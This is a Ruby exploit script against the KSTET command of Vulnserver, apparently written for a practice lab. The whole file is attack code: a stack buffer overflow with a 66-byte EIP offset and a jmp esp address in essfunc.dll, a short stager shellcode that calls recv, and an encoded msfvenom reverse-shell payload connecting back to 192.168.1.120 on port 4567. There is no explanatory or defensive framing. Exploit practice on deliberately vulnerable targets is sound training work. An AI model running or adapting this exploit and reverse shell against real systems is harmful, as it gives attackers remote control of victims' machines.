#!/usr/bin/ruby
require 'socket'

target = '192.168.1.121'
port = 9999

#eip offset at 66
first_stage = "A" * 66
# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\werebug\Desktop\Vulnserver\essfunc.dll)
first_stage += "\xaf\x11\x50\x62"
# call_recv-in-esp.bin 18 bytes
first_stage += "\x54\x58\x04\x14\x52\x80\xc6\x02\x52\x50\x53\xb8\x5a\x61\xa3\x71\xff\xd0"
first_stage += "\x90" * 2

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.120 LPORT=4567 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00" -f ruby
payload = "\x90" * 16
payload += "\xd9\xec\xba\x5e\xbf\xb2\xcf\xd9\x74\x24\xf4\x5e\x2b\xc9" +
"\xb1\x52\x31\x56\x17\x83\xc6\x04\x03\x08\xac\x50\x3a\x48" +
"\x3a\x16\xc5\xb0\xbb\x77\x4f\x55\x8a\xb7\x2b\x1e\xbd\x07" +
"\x3f\x72\x32\xe3\x6d\x66\xc1\x81\xb9\x89\x62\x2f\x9c\xa4" +
"\x73\x1c\xdc\xa7\xf7\x5f\x31\x07\xc9\xaf\x44\x46\x0e\xcd" +
"\xa5\x1a\xc7\x99\x18\x8a\x6c\xd7\xa0\x21\x3e\xf9\xa0\xd6" +
"\xf7\xf8\x81\x49\x83\xa2\x01\x68\x40\xdf\x0b\x72\x85\xda" +
"\xc2\x09\x7d\x90\xd4\xdb\x4f\x59\x7a\x22\x60\xa8\x82\x63" +
"\x47\x53\xf1\x9d\xbb\xee\x02\x5a\xc1\x34\x86\x78\x61\xbe" +
"\x30\xa4\x93\x13\xa6\x2f\x9f\xd8\xac\x77\xbc\xdf\x61\x0c" +
"\xb8\x54\x84\xc2\x48\x2e\xa3\xc6\x11\xf4\xca\x5f\xfc\x5b" +
"\xf2\xbf\x5f\x03\x56\xb4\x72\x50\xeb\x97\x1a\x95\xc6\x27" +
"\xdb\xb1\x51\x54\xe9\x1e\xca\xf2\x41\xd6\xd4\x05\xa5\xcd" +
"\xa1\x99\x58\xee\xd1\xb0\x9e\xba\x81\xaa\x37\xc3\x49\x2a" +
"\xb7\x16\xdd\x7a\x17\xc9\x9e\x2a\xd7\xb9\x76\x20\xd8\xe6" +
"\x67\x4b\x32\x8f\x02\xb6\xd5\x70\x7a\xb9\x5d\x19\x79\xb9" +
"\x8c\x0e\xf4\x5f\xc4\xa0\x51\xc8\x71\x58\xf8\x82\xe0\xa5" +
"\xd6\xef\x23\x2d\xd5\x10\xed\xc6\x90\x02\x9a\x26\xef\x78" +
"\x0d\x38\xc5\x14\xd1\xab\x82\xe4\x9c\xd7\x1c\xb3\xc9\x26" +
"\x55\x51\xe4\x11\xcf\x47\xf5\xc4\x28\xc3\x22\x35\xb6\xca" +
"\xa7\x01\x9c\xdc\x71\x89\x98\x88\x2d\xdc\x76\x66\x88\xb6" +
"\x38\xd0\x42\x64\x93\xb4\x13\x46\x24\xc2\x1b\x83\xd2\x2a" +
"\xad\x7a\xa3\x55\x02\xeb\x23\x2e\x7e\x8b\xcc\xe5\x3a\xab" +
"\x2e\x2f\x37\x44\xf7\xba\xfa\x09\x08\x11\x38\x34\x8b\x93" +
"\xc1\xc3\x93\xd6\xc4\x88\x13\x0b\xb5\x81\xf1\x2b\x6a\xa1" +
"\xd3"
payload += "\x90" * (512 - payload.length)

s = TCPSocket.open(target, port)
s.recv(1024)
s.puts('KSTET /.:/' + first_stage)
s.puts(payload)
s.close()
